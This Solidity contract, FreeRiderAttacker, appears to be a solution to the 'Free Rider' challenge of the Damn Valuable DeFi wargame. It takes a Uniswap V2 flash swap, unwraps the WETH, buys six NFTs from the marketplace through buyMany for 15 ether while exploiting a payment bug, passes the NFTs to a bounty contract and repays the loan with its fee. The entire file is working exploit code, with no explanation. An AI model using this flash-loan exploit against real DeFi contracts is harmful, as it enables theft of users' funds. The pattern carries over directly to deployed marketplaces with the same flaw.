pragma solidity ^0.6.6;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
// import "../DamnValuableNFT.sol";
// import "../free-rider/FreeRiderNFTMarketplace.sol";
import '@uniswap/v2-periphery/contracts/interfaces/IWETH.sol';

interface IERC721Receiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4);
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    address private immutable attacker;
    address private target;
    address private factory;
    address private damnValuableNFT;
    address private devsContract;
    IWETH private weth;

    constructor(address _target, address _factory, address _damnValuableNFT, address _devsContract, IWETH _weth) public {
        attacker = msg.sender;
        target = _target;
        factory = _factory;
        damnValuableNFT = _damnValuableNFT;
        devsContract = _devsContract;
        weth = _weth;
    }

    receive() external payable {}

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        (sender, amount1);
        address token0 = IUniswapV2Pair(msg.sender).token0(); //weth
        address token1 = IUniswapV2Pair(msg.sender).token1(); //damn token
        assert(msg.sender == UniswapV2Library.pairFor(factory, token0, token1));

        weth.withdraw(amount0);
        require(address(this).balance >= amount0, "not enough ethers");

        uint256[] memory nftIds = new uint256[](6);
        nftIds[0] = 0;
        nftIds[1] = 1; 
        nftIds[2] = 2; 
        nftIds[3] = 3; 
        nftIds[4] = 4; 
        nftIds[5] = 5; 
        (bool success,) = target.call{value: 15 ether, gas: 1e6}(abi.encodeWithSignature("buyMany(uint256[])", nftIds));
        require(success, "can't buy NFT");
        for (uint256 tokenId = 0; tokenId < nftIds.length; tokenId++) {
            (success,) = damnValuableNFT.call{gas: 1e6}(
                abi.encodeWithSignature("safeTransferFrom(address,address,uint256,bytes)", 
                address(this), 
                devsContract,
                tokenId,
                data));
            require(success, "can't transfer");
        }

        require(address(this).balance == 90 ether, "can't attack market");
        weth.deposit{value: amount0 + 0.04545 ether}(); //principal + fee (15 ethers + 0.3%)

        //payback principal + fee (15 ethers + 0.3%)
        (success,) = token0.call{gas: 1e6}(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, amount0 + 0.04545 ether));
        require(success, "can't payback");
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external
        override
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}